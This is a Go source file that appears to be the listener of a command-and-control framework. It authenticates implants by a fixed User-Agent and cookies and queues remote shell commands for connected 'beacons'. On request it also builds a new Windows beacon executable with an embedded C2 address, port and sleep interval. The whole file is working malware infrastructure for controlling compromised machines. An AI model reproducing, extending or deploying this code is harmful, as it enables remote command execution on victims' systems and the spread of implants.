package main

import (
	"encoding/binary"
	"fmt"
	"github.com/gorilla/websocket"
	"io/ioutil"
	"net/http"
	"strconv"
)

var CONFIG, _ = parseConfig("./Client/config.xml")

var expectedHeaders = map[string]string{
	"User-Agent": CONFIG.Useragent,
}

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener) {
	headers := r.Header

	for header, expectedValue := range expectedHeaders {
		value := headers.Get(header)

		if value != expectedValue {
			http.Error(w, fmt.Sprintf("Forbidden: Header value for %s does not match", header), http.StatusForbidden)
			return
		}
	}

	if r.Method == http.MethodGet {
		cookies := r.Cookies()
		cookie := ""

		for _, i := range cookies {
			cookie += i.Value
		}
		res, love := GET_handler(cookie, listener, r)
		if !love {
			http.Error(w, fmt.Sprintf("Forbidden: Cookie for %s does not match", cookie), http.StatusForbidden)
			return
		} else {
			w.WriteHeader(http.StatusOK)
			res_tmp := make([]byte, 4)
			binary.LittleEndian.PutUint32(res_tmp, 0xbeebeebe)
			res = append(res, res_tmp...)
			w.Write(res)
			res = make([]byte, 0)
		}

	}

	if r.Method == http.MethodPost {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading request body", http.StatusInternalServerError)
			return
		}
		defer r.Body.Close()
		w.WriteHeader(http.StatusOK)

		if headers.Get("Iamfrom") == "C2AUTH" {
			var res []byte
			switch Check_Command(body) {
			case 0:
				break
			case BEACONS:
				tmp := len(listener.Beacons)
				res = []byte("{\"c2\":" + strconv.Itoa(tmp) + "}")
				Send_Bytes_to(w, res, "http://localhost:"+strconv.Itoa(int(CONFIG.C2port-1))+"/c2", expectedHeaders)
				res = make([]byte, 0)
				break
			case SHELL:
				body = body[4:]
				id := int(body[0])
				var job Job
				job.command = binary.BigEndian.Uint16(body[1:3])

				job.shell = string(body[3:])
				job.funny = true

				listener.Beacons[id].jobs = append(listener.Beacons[id].jobs, job)
			case NEWBEACON:
				body = body[4:]
				var config OblivionisConfig
				config.c2addr = strconv.Itoa(int(body[0])) + "." + strconv.Itoa(int(body[1])) + "." + strconv.Itoa(int(body[2])) + "." + strconv.Itoa(int(body[3]))
				config.c2port = binary.BigEndian.Uint16(body[4:6])
				config.useragent = CONFIG.Useragent
				config.a = listener.A
				config.url = ""
				config.sleep = binary.BigEndian.Uint32(body[6:])
				config.host = CONFIG.Host
				GenerateOblivionis(config, "./beacons/beacon.exe")

				println("had made beacon")
			}

		} else {
			res, love := POST_handler(body, listener, r, w)
			if !love {
				http.Error(w, fmt.Sprintf("Forbidden: bad regist or not get"), http.StatusForbidden)
				return
			} else {
				w.Write(res)
				res = make([]byte, 0)
			}
		}
	}
}

func main() {
	port2 := CONFIG.C2port
	StartClient("client", port2)

}
